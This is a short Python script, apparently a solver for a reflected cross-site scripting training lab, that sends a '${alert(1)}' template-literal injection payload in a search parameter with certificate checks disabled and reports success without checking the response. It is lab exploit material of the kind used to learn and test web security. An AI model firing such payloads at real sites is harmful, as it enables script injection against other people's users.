import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped"

def run(url, payload, proxies=None):
    path = "?search="
    payload = "${alert(1)}"
    try:
        r = requests.get(url.rstrip('/') + path + payload, verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False